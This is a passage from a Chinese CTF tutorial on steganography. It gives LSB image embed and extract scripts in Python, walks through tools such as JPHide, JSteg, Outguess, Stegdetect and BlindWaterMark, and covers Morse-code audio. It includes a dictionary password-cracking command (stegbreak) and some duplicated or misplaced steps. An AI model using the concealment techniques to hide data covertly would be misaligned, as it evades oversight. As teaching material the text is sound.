class="keyword">str</span></span><br><span class="line">def <span class="keyword">mod</span>(x,y):</span><br><span class="line">    <span class="keyword">return</span> x%y;</span><br><span class="line"><span class="meta">#str1为载体图片路径，str2为隐写文件，str3为加密图片保存的路径</span></span><br><span class="line">def func(str1,str2,str3):  </span><br><span class="line">    im = Image.open(str1)</span><br><span class="line">    <span class="meta">#获取图片的宽和高</span></span><br><span class="line">    width = im.size[<span class="number">0</span>]</span><br><span class="line">    print <span class="string">"width:"</span>+<span class="keyword">str</span>(width)+<span class="string">"\n"</span></span><br><span class="line">    height = im.size[<span class="number">1</span>]</span><br><span class="line">    print <span class="string">"height:"</span>+<span class="keyword">str</span>(height)+<span class="string">"\n"</span></span><br><span class="line">    <span class="keyword">count</span> = <span class="number">0</span></span><br><span class="line">    <span class="meta">#获取需要隐藏的信息</span></span><br><span class="line">    key = get_key(str2)</span><br><span class="line">    keylen = len(key)</span><br><span class="line">    <span class="keyword">for</span> h in range(<span class="number">0</span>,height):</span><br><span class="line">        <span class="keyword">for</span> w in range(<span class="number">0</span>,width):</span><br><span class="line">            pixel = im.getpixel((w,h))</span><br><span class="line">            a=pixel[<span class="number">0</span>]</span><br><span class="line">            b=pixel[<span class="number">1</span>]</span><br><span class="line">            c=pixel[<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">count</span> == keylen:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="meta">#下面的操作是将信息隐藏进去</span></span><br><span class="line">            <span class="meta">#分别将每个像素点的RGB值余2，这样可以去掉最低位的值</span></span><br><span class="line">            <span class="meta">#再从需要隐藏的信息中取出一位，转换为整型</span></span><br><span class="line">            <span class="meta">#两值相加，就把信息隐藏起来了</span></span><br><span class="line">            a= a-<span class="keyword">mod</span>(a,<span class="number">2</span>)+<span class="keyword">int</span>(key[<span class="keyword">count</span>])</span><br><span class="line">            <span class="keyword">count</span>+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">count</span> == keylen:</span><br><span class="line">                im.putpixel((w,h),(a,b,c))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            b =b-<span class="keyword">mod</span>(b,<span class="number">2</span>)+<span class="keyword">int</span>(key[<span class="keyword">count</span>])</span><br><span class="line">            <span class="keyword">count</span>+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">count</span> == keylen:</span><br><span class="line">                im.putpixel((w,h),(a,b,c))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            c= c-<span class="keyword">mod</span>(c,<span class="number">2</span>)+<span class="keyword">int</span>(key[<span class="keyword">count</span>])</span><br><span class="line">            <span class="keyword">count</span>+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">count</span> == keylen:</span><br><span class="line">                im.putpixel((w,h),(a,b,c))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">count</span> % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">                im.putpixel((w,h),(a,b,c))</span><br><span class="line">    im.save(str3)</span><br><span class="line"><span class="meta">#原图</span></span><br><span class="line">old = <span class="string">"C:\Users\yiming\Desktop\heetian.png"</span></span><br><span class="line"><span class="meta">#处理后输出的图片路径</span></span><br><span class="line"><span class="keyword">new</span> = <span class="string">"C:\Users\yiming\Desktop\heetian_LSB.png"</span></span><br><span class="line"><span class="meta">#需要隐藏的信息</span></span><br><span class="line">enc = <span class="string">"C:\Users\yiming\Desktop\flag.txt"</span></span><br><span class="line">func(old,enc,<span class="keyword">new</span>)</span><br></pre></td></tr></table></figure></div>

<p><strong>python最低有效位提取脚本</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AXAPTA"><figure class="iseeu highlight /axapta"><table><tr><td class="code"><pre><span class="line"><span class="meta"># -*- coding:UTF-8 -*-</span></span><br><span class="line">from PIL import Image</span><br><span class="line">def <span class="keyword">mod</span>(x,y):</span><br><span class="line">    <span class="keyword">return</span> x%y;</span><br><span class="line">def toasc(strr):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">int</span>(strr, <span class="number">2</span>)</span><br><span class="line"><span class="meta">#le为所要提取的信息的长度，str1为加密载体图片的路径，str2为提取文件的保存路径</span></span><br><span class="line">def func(le,str1,str2):</span><br><span class="line">    a=<span class="string">""</span></span><br><span class="line">    b=<span class="string">""</span></span><br><span class="line">    im = Image.open(str1)</span><br><span class="line">    lenth = le*<span class="number">8</span></span><br><span class="line">    width = im.size[<span class="number">0</span>]</span><br><span class="line">    height = im.size[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">count</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> h in range(<span class="number">0</span>, height):</span><br><span class="line">        <span class="keyword">for</span> w in range(<span class="number">0</span>, width):</span><br><span class="line">             <span class="meta">#获得(w,h)点像素的值</span></span><br><span class="line">            pixel = im.getpixel((w, h))</span><br><span class="line">            <span class="meta">#此处余3，依次从R、G、B三个颜色通道获得最低位的隐藏信息</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">count</span>%<span class="number">3</span>==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">count</span>+=<span class="number">1</span></span><br><span class="line">                b=b+<span class="keyword">str</span>((<span class="keyword">mod</span>(<span class="keyword">int</span>(pixel[<span class="number">0</span>]),<span class="number">2</span>)))</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">count</span> ==lenth:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">count</span>%<span class="number">3</span>==<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">count</span>+=<span class="number">1</span></span><br><span class="line">                b=b+<span class="keyword">str</span>((<span class="keyword">mod</span>(<span class="keyword">int</span>(pixel[<span class="number">1</span>]),<span class="number">2</span>)))</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">count</span> ==lenth:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">count</span>%<span class="number">3</span>==<span class="number">2</span>:</span><br><span class="line">                <span class="keyword">count</span>+=<span class="number">1</span></span><br><span class="line">                b=b+<span class="keyword">str</span>((<span class="keyword">mod</span>(<span class="keyword">int</span>(pixel[<span class="number">2</span>]),<span class="number">2</span>)))</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">count</span> ==lenth:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">count</span> == lenth:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    with open(str2,<span class="string">"wb"</span>) as f:</span><br><span class="line">        <span class="keyword">for</span> i in range(<span class="number">0</span>,len(b),<span class="number">8</span>):</span><br><span class="line">             <span class="meta">#以每8位为一组二进制，转换为十进制</span></span><br><span class="line">            stra = toasc(b[i:i+<span class="number">8</span>])</span><br><span class="line">            <span class="meta">#将转换后的十进制数视为ascii码，再转换为字符串写入到文件中</span></span><br><span class="line">            f.write(chr(stra))</span><br><span class="line">            stra =<span class="string">""</span></span><br><span class="line">    f.closed</span><br><span class="line"><span class="meta">#文件长度</span></span><br><span class="line">le = <span class="number">30</span></span><br><span class="line"><span class="meta">#含有隐藏信息的图片</span></span><br><span class="line"><span class="keyword">new</span> = <span class="string">"C:\Users\lenovo\Desktop\LSB\demo2\heetian_LSB.png"</span></span><br><span class="line"><span class="meta">#信息提取出后所存放的文件</span></span><br><span class="line">tiqu = <span class="string">"C:\Users\lenovo\Desktop\LSB\demo2\get_flag.txt"</span></span><br><span class="line">func(le,<span class="keyword">new</span>,tiqu)</span><br></pre></td></tr></table></figure></div>

<p>可以在图片中隐藏字符串，也可以在图片中隐藏图片</p>
<p><strong>实验：</strong></p>
<p><strong>思考</strong></p>
<ol>
<li>我们这里用的LSB隐均对R,G,B，三种颜色都加以修改是否可以只修改一个颜色？</li>
<li>参考2016 HCTF的官方Writeup学习如何实现将一个文件以LSB的形式加以隐写。</li>
</ol>
<hr>
<h4 id="四、基于DCT域的JPG图片隐写"><a href="#四、基于DCT域的JPG图片隐写" class="headerlink" title="四、基于DCT域的JPG图片隐写"></a>四、基于DCT域的JPG图片隐写</h4><p>这个基于DCT域的JPG图片隐写原理太难，没必要搞懂原理，知道有哪几个类型的题目和解法就行。</p>
<h5 id="背景知识-2"><a href="#背景知识-2" class="headerlink" title="背景知识"></a>背景知识</h5><p>JPEG图像格式使用离散余弦变换（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种有损压缩（Loss Compression）技术，但一般不会影响图像的视觉效果。</p>
<p><strong>基于DCT域的JPG图片隐写分类：</strong></p>
<ul>
<li>JPHide</li>
<li>JSteg</li>
<li>Outguess</li>
<li>F5等</li>
</ul>
<h5 id="常用工具：-2"><a href="#常用工具：-2" class="headerlink" title="常用工具："></a>常用工具：</h5><ul>
<li>Stegdetect</li>
<li>JPHS</li>
<li>Jsteg</li>
<li>Outguess</li>
</ul>
<h5 id="A-JPhide隐写—jpg隐写"><a href="#A-JPhide隐写—jpg隐写" class="headerlink" title="A.JPhide隐写—jpg隐写"></a>A.JPhide隐写—jpg隐写</h5><p><strong>隐写原理</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">Jphide是基于最低有效位LSB的JPEG格式图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在DCT变换域上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时Blowfish算法有较强的抗统计检测能力。</span><br><span class="line">由于JPEG图像格式使用离散余弦变换（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个<span class="number">8</span>×<span class="number">8</span>像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种有损压缩（Loss Compression）技术，但一般不会影响图像的视觉效果。</span><br></pre></td></tr></table></figure></div>

<p><strong>隐写过程</strong></p>
<p>JPhide隐写过程大致为：</p>
<ul>
<li>先解压压缩JPEG图像，得到DCT系数；</li>
<li>然后对隐藏信息用户给定的密码进行Blowfish加密；</li>
<li>再利用Blowfish算法生成伪随机序列，并据此找到需要改变的DCT系数，将其末位变为需要隐藏的信息的值。最后把DCT系数重新压回成JPEG图片；</li>
</ul>
<p><img src="https://i.loli.net/2020/06/12/c8BWkE1KjvA76Pu.png" alt="img"></p>
<p><strong>隐写实现</strong></p>
<p>1.Stegdetect<br>实现JPEG图像JPhide隐写算法工具有多个，比如由Neils Provos开发通过统计分析技术评估JPEG文件的DCT频率系数的隐写工具 Stegdetect，它可以检测到通过<font color=red>JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage</font>等这些隐写工具隐藏的信息，并且还具有基于字典暴力破解密码方法提取通过JPhide、outguess和jsteg-shell方式嵌入的隐藏信息。<br>2.JPHS<br>另一款JPEG图像的信息隐藏软件JPHS，它是由Allan Latham开发设计实现在Windows和Linux系统平台针对有损压缩JPEG文件进行信息加密隐藏和探测提取的工具。软件里面主要包含了两个程序JPHIDE和JPSEEK， JPHIDE程序主要是实现将信息文件加密隐藏到JPEG图像功能，而JPSEEK程序主要实现从用JPHIDE程序加密隐藏得到的JPEG图像探测提取信息文件，Windows版本的JPHS里的JPHSWIN程序具有图形化操作界面且具备JPHIDE和JPSEEK的功能。</p>
<p><img src="https://i.loli.net/2020/06/12/HDcyNhuowI7dSJF.png" alt="img"></p>
<p>2.分别准备一个JPEG格式的图片（example.jpg）和一个文本文件（flag.txt）。</p>
<p>由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG格式-JPEG文件交换格式（JPEG File Interchange Format，JFIF）作为示例。<br>这里简单介绍JPEG文件交换格式的JPEG图片的图像开始标记SOI（Start of Image）和应用程序保留标记APP0（Application 0），JPEG文件交换格式的JPEG图片开始前2个字节是图像开始标记为0xFFD8，之后2个字节接着便是应用程序保留标记为0xFFE0，应用程序保留标记APP0包含9个具体字段，这里介绍前三个字段，第一个字段是数据长度占2个字节，表示包括本字段但不包括标记代码的总长度，这里为10个字节，第二个字段是标识符占5个字节0x4A46494600表示“JFIF0”字符串，第三个字段是版本号占2个字节，这里是0X0101，表示JFIF的版本号为1.1，但也可能为其它数值，从而代表了其它版本号。</p>
<p>分别准备一个JPEG格式的图片（111.jpg）和一个文本文件（flag.txt）。</p>
<p>由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG格式-JPEG文件交换格式（JPEG File Interchange Format，JFIF）作为示例。</p>
<p>由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG格式-JPEG文件交换格式（JPEG File Interchange Format，JFIF）作为示例。</p>
<p>JPEG是一种压缩标准，有很多种采用不同文件交换格式的JPG图片。</p>
<p>这里简单介绍JPEG文件交换格式的JPEG图片的图像开始标记SOI（Start of Image）和应用程序保留标记APP0（Application 0）</p>
<p><img src="https://i.loli.net/2020/06/12/kHMz9CrNKIw4TQ7.png" alt="image-20200612192533248"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">FF D8</span><br><span class="line"><span class="comment">//JPEG文件交换格式的JPEG图片开始前2个字节是图像开始标记 FF D8</span></span><br><span class="line">FF E0 </span><br><span class="line"><span class="comment">//之后2个字节是应用程序保留标记 FF E0</span></span><br><span class="line"><span class="number">00</span> <span class="number">10</span></span><br><span class="line"><span class="comment">//应用程序保留标记APP0包含9个具体字段，这里介绍前三个字段，第一个字段是数据长度占2个字节 00 10,表示包括本字段但不包括标记代码的总长度</span></span><br><span class="line"><span class="number">4</span>A <span class="number">46</span> <span class="number">49</span> <span class="number">46</span> <span class="number">00</span></span><br><span class="line"><span class="comment">//第二个字段是标识符占5个字节0x4A46494600表示“JFIF0”字符串</span></span><br><span class="line"><span class="number">01</span> <span class="number">01</span></span><br><span class="line"><span class="comment">//第三个字段是版本号占2个字节，这里是01 01,表示JFIF的版本号为1.1,但也可能为其它数值，从而代表了其它版本号。</span></span><br></pre></td></tr></table></figure></div>

<p>1、Windows版本可以使用具有图形化操作界面的Jphswin，选择“Open jpeg”打开示例JPEG格式图片111.jpg</p>
<p><img src="https://i.loli.net/2020/06/12/m7lZu4LbnGwiIyh.png" alt="image-20200612192920524"></p>
<p>如果你选择的不是JPEG格式的图片程序会自动退出，你可以16进制编辑器如Winhex查看图片的图像开始标记SOI和应用程序保留标记APP0，当载入JPEG格式图片会显示一些图片的属性。</p>
<p><img src="https://i.loli.net/2020/06/12/WOxzBF587jDyETb.png" alt="image-20200612192943561"></p>
<p>2、选择“Hide”选项之后在两次文本框输入相同的密码，这里以输入flag作为密码为例，然后输入要包含隐藏信息的文本。</p>
<p><img src="https://i.loli.net/2020/06/12/q2N3cvbLlBWPXSC.png" alt="image-20200612193040489"></p>
<p><img src="https://i.loli.net/2020/06/12/2M61E7UwXqFeyza.png" alt="image-20200612193059255"></p>
<p>3、选择“Save jpeg as”选项将图片另存为jpeg格式并输入文件的名称为新的图像文件如123.jpg</p>
<p><img src="https://i.loli.net/2020/06/12/ZsJfSWBc6DjxXRK.png" alt="image-20200612193157903"></p>
<p>4.之后便可以看到生成结果和相关信息，JPhide隐写生成过程就完成了</p>
<p><img src="https://i.loli.net/2020/06/12/lgq4HpYXxynvw35.png" alt="image-20200612193225396"></p>
<p><strong>解法：</strong></p>
<p>当我们拿到一道JPG图片隐写的题时，可以先用Stegdetect检测是以哪种隐写方式加密的。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="code"><pre><span class="line">Stegdetect的主要选项如下：</span><br><span class="line"></span><br><span class="line"><span class="deletion">-q 仅显示可能包含隐藏内容的图像。 </span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-n 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。 </span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-d 打印带行号的调试信息。 </span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下： </span></span><br><span class="line">	j 检测图像中的信息是否是用jsteg嵌入的。 </span><br><span class="line">	o 检测图像中的信息是否是用outguess嵌入的。 </span><br><span class="line">	p 检测图像中的信息是否是用jphide嵌入的。 </span><br><span class="line">	i 检测图像中的信息是否是用invisible secrets嵌入的。 </span><br><span class="line"><span class="deletion">-V 显示软件版本号。</span></span><br></pre></td></tr></table></figure></div>

<p>1.将图片复制到stegdetect.exe所在目录下，右键PowerShell命令<code>stegdetect.exe -tjopi -s 10.0 hide.jpg</code>检测该图片用的是哪种加密方式</p>
<p>2.然而我们并不知道密码是啥，这时可以用stegdetect下的stegbreak字典破解，同样图片和stegbreak.exe在同一目录下，命令<code>stegbreak.exe -r rules.ini -f password.txt -r p hide.jpg</code>破解密码</p>
<p>3.使用jphide下的工具JPHS从hide.jpg图片提取出隐藏信息</p>
<p><strong>实验：</strong></p>
<p>首先，在cmd/powershell中运行<code>Stegdetect</code>，对目标图片进行检测</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200613125042445.png" alt="image-20200613125042445"></p>
<p>发现结果显示是jphide隐写的可能性很大。<br><strong>接着，我们使用工具JPHS提取信息</strong></p>
<p><img src="https://i.loli.net/2020/06/13/JeDPrQ3MKizxBN1.png" alt="image-20200613125242778"></p>
<p>然后打开保存的txt文件，即得flag</p>
<p><img src="https://i.loli.net/2020/06/13/hC1VbJczpwg6T93.png" alt="image-20200613125410159"></p>
<p>得到flag</p>
<p><img src="https://i.loli.net/2020/06/13/8kDlNi4aZ5WI7y3.png" alt="image-20200613125859949"></p>
<h5 id="B-JSteg隐写—jpg隐写"><a href="#B-JSteg隐写—jpg隐写" class="headerlink" title="B.JSteg隐写—jpg隐写"></a>B.JSteg隐写—jpg隐写</h5><p>隐写工具：jsteg</p>
<p>先用Stegdetect检测加密类型</p>
<p>再用jsteg解密</p>
<p>隐写写入：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">jsteg-windows-amd64</span><span class="selector-class">.exe</span> <span class="selector-tag">hide</span> 123<span class="selector-class">.jpg</span> <span class="selector-tag">flag</span><span class="selector-class">.txt</span> <span class="selector-tag">out</span><span class="selector-class">.jpg</span></span><br></pre></td></tr></table></figure></div>

<p>解密隐写：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">jsteg-windows-amd64</span><span class="selector-class">.exe</span> <span class="selector-tag">reveal</span> <span class="selector-tag">out</span><span class="selector-class">.jpg</span> <span class="selector-tag">out</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2020/06/13/bcx4o3Cw1yiFJzY.png" alt="image-20200613133121279"></p>
<h5 id="C-Outguess隐写—jpg隐写"><a href="#C-Outguess隐写—jpg隐写" class="headerlink" title="C.Outguess隐写—jpg隐写"></a>C.Outguess隐写—jpg隐写</h5><p>工具：Outguess工具</p>
<p><strong>解题步骤：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line"><span class="bullet">- </span>使用Stegdetect对图片的隐写方式进行检测</span><br><span class="line"><span class="bullet">- </span>从结果中得知是使用JPHide的隐写，使用JPHS工具对隐写信息进行提取</span><br><span class="line"><span class="bullet">- </span>最后打开保存的文件</span><br></pre></td></tr></table></figure></div>

<p><strong>第一步，在cmd中运行，Stegdetect，对目标图片进行检测</strong></p>
<p><strong>第二步，使用Outguess工具提取隐写信息</strong></p>
<p>点击Enter key功能，输入密码<br>点击Load image 加载目标图片<br>点击Extract file功能，将提取出来的信息保存成flag.txt文件。</p>
<p>打开flag.txt文件得到flag</p>
<p><strong>思考</strong></p>
<ol>
<li>尝试其他DCT域隐写，如F5</li>
<li>自己尝试使用JPHS的Hide功能，实现一个隐写。</li>
</ol>
<hr>
<h4 id="五、数字水印的隐写"><a href="#五、数字水印的隐写" class="headerlink" title="五、数字水印的隐写"></a>五、数字水印的隐写</h4><h5 id="背景知识-3"><a href="#背景知识-3" class="headerlink" title="背景知识"></a>背景知识</h5><p><strong>数字水印</strong><br>数字水印技术，是指在数字化的数据内容中嵌入不明显的记号。<br>特征是，被嵌入的记号通常是不可见或不可察的，但是可以通过计算操作检测或者提取。</p>
<p>盲水印，是指人感知不到的水印，包括看不到或听不见（没错，数字盲水印也能够用于音频）。其主要应用于音像作品、数字图书等，目的是，在不破坏原始作品的情况下，实现版权的防护与追踪。</p>
<p>添加数字盲水印的方法简单可分为<font color=red>空域方法</font>和<font color=red>频域方法</font>，这两种方法添加了冗余信息，但在编码和压缩情况不变的情况下，不会使原始图像大小产生变化（原来是10MB添加盲水印之后还是10MB）。</p>
<p>空域是指空间域，我们日常所见的图像就是空域。空域添加数字水印的方法是在空间域直接对图像操作（之所以说的这么绕，是因为不仅仅原图是空域，原图的差分等等也是空域），比如将水印直接叠加在图像上。</p>
<p>相对于空域方法，<font color=red>频域加盲水印</font>的方法隐匿性更强，抵抗攻击能力更强。这类算法解水印困难，你不知道水印加在那个频段，而且受到攻击往往会破坏图像原本内容</p>
<p>我们常说一个音有多高，这个音高是指频率；同样，图像灰度变化强烈的情况，也可以视为图像的频率。频域添加数字水印的方法，是指通过某种变换手段（傅里叶变换，离散余弦变换，小波变换等）将图像变换到频域（小波域），在频域对图像添加水印，再通过逆变换，将图像转换为空间域。相对于空域手段，频域手段隐匿性更强，抗攻击性更高。</p>
<p>所谓对水印的攻击，是指破坏水印，包括涂抹，剪切，放缩，旋转，压缩，加噪，滤波等。数字盲水印不仅仅要敏捷性高（不被人抓到），也要防御性强（抗打）。就像Dota的敏捷英雄往往是脆皮，数字盲水印的隐匿性和鲁棒性是互斥的。（鲁棒性是抗攻击性的学术名字）</p>
<h5 id="常用工具：-3"><a href="#常用工具：-3" class="headerlink" title="常用工具："></a>常用工具：</h5><p>BlindWaterMark</p>
<p>工具github地址：<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">https://github.com/chishaxie/BlindWaterMark</a></p>
<p><strong>解法：</strong></p>
<p>盲水印一般会有两张图，一张图是原图，一张为添加了水印的</p>
<p>使用BlindWaterMark工具提取</p>
<p>合成盲水印图</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">bwm</span><span class="selector-class">.py</span> <span class="selector-tag">encode</span> <span class="selector-tag">hui</span><span class="selector-class">.png</span> <span class="selector-tag">wm</span><span class="selector-class">.png</span> <span class="selector-tag">hui_with_wm</span><span class="selector-class">.png</span></span><br></pre></td></tr></table></figure></div>

<p>提取图中的盲水印 (需要原图)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">bwm</span><span class="selector-class">.py</span> <span class="selector-tag">decode</span> <span class="selector-tag">hui</span><span class="selector-class">.png</span> <span class="selector-tag">hui_with_wm</span><span class="selector-class">.png</span> <span class="selector-tag">wm_from_hui</span><span class="selector-class">.png</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2020/06/13/8lSaKOjw4FDZpBY.png" alt="image-20200613151739239"></p>
<p>有想要深入了解的同学可以去看这篇文章：</p>
<p><a href="https://stgod.com/1482/" target="_blank" rel="noopener">https://stgod.com/1482/</a></p>
<p><strong>思考</strong></p>
<ol>
<li>请查阅关于空域盲水印的资料</li>
<li>试着对频域盲水印攻击，如截屏、倒转等操作，再进行提取水印，看看水印是否被破坏。</li>
</ol>
<hr>
<h4 id="六、图片容差的隐写"><a href="#六、图片容差的隐写" class="headerlink" title="六、图片容差的隐写"></a>六、图片容差的隐写</h4><h5 id="背景知识-4"><a href="#背景知识-4" class="headerlink" title="背景知识"></a>背景知识</h5><p><strong>容差</strong><br>容差，在选取颜色时所设置的选取范围，容差越大，选取的范围也越大，其数值是在0-255之间。</p>
<h5 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h5><p><strong>beyond compare</strong></p>
<p>beyond compare是一款很适合用来对图片进行比较的工具，就图片而言，它支持容差、范围、混合等模式。</p>
<p><strong>容差比较的隐写</strong></p>
<p>没有找到题所以就介绍一下解法</p>
<p><strong>解法：</strong></p>
<p>打开工具，选择图片比较，导入两张图片</p>
<p>选择容差大小，进行比较得到flag</p>
<p><img src="https://i.loli.net/2020/06/13/mJTRLNEApdvIwYb.png" alt="image-20200613153005517"></p>
<p><strong>提示：</strong></p>
<p>如果在CTF赛场中，就隐写这一部分，出题人给于两张或者多张图片，一般都是需要对图片的内容进行比较的</p>
<hr>
<h3 id="多媒体文件隐写"><a href="#多媒体文件隐写" class="headerlink" title="多媒体文件隐写"></a>多媒体文件隐写</h3><p>音频、视频等多媒体也是我们生活经常看到的文件格式。我们上网听音乐，看视频，都离不开多媒体，一方面多媒体文件一般比单独的图片文件大，这是否也意味着能存储更多的信息，也可以隐藏更多的信息呢？</p>
<p>多媒体文件隐写分为：</p>
<ul>
<li>音频隐写</li>
<li>视频隐写</li>
</ul>
<hr>
<h4 id="一、音频隐写"><a href="#一、音频隐写" class="headerlink" title="一、音频隐写"></a>一、音频隐写</h4><p>音频隐写大致分为两大类：</p>
<ul>
<li>音轨插入摩尔斯电码</li>
<li>MP3stego隐写</li>
</ul>
<h4 id="常用工具：-4"><a href="#常用工具：-4" class="headerlink" title="常用工具："></a>常用工具：</h4><ul>
<li>Audacity</li>
<li>MP3stego</li>
</ul>
<h5 id="A-摩尔斯电码音频隐写"><a href="#A-摩尔斯电码音频隐写" class="headerlink" title="A.摩尔斯电码音频隐写"></a>A.摩尔斯电码音频隐写</h5><p><strong>背景知识</strong></p>
<p>摩尔斯电码（又译为摩斯密码，Morse code）是一种时通时断的信号代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。在过去它以电报的形式来发送消息，如今当听到这样的电报你还能解出的他它的明文吗？</p>
<p><strong>摩尔斯电码对照表</strong></p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/%E5%9B%BD%E9%99%85%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81.svg/315px-%E5%9B%BD%E9%99%85%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81.svg.png" alt="摩尔斯电码- 维基百科，自由的百科全书"></p>
<p><strong>实验：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>在实验机中找到隐写术目录，打多媒体隐写，进一步找到文件夹音频隐写的目录下找到莫尔斯电码.mp3 文件</span><br><span class="line"><span class="bullet">- </span>我们可以先双击点开，尝试听一下内容，我们会听到在影视中常常听见的电报的发文声</span><br><span class="line"><span class="bullet">- </span>由于，单靠听我们很难直接辨别出长短，毕竟我们不是专业的，我们可以尝试用Audacity打开文件</span><br><span class="line"><span class="bullet">- </span>短代表点，长代表横，对照电码表，翻译出flag</span><br><span class="line"><span class="bullet">- </span>翻译摩尔斯电码可以使用在线翻译网站</span><br></pre></td></tr></table></figure></div>

<p><strong>当我们确认是摩尔斯电报之后，我先用Audacity打开目标文件，并观察波形</strong></p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614093414910.png" alt="image-20200614093414910"></p>
<p><strong>以长的代表代表横线，短的代表点，大的间隔是空格，抄写下摩尔斯电码</strong></p>
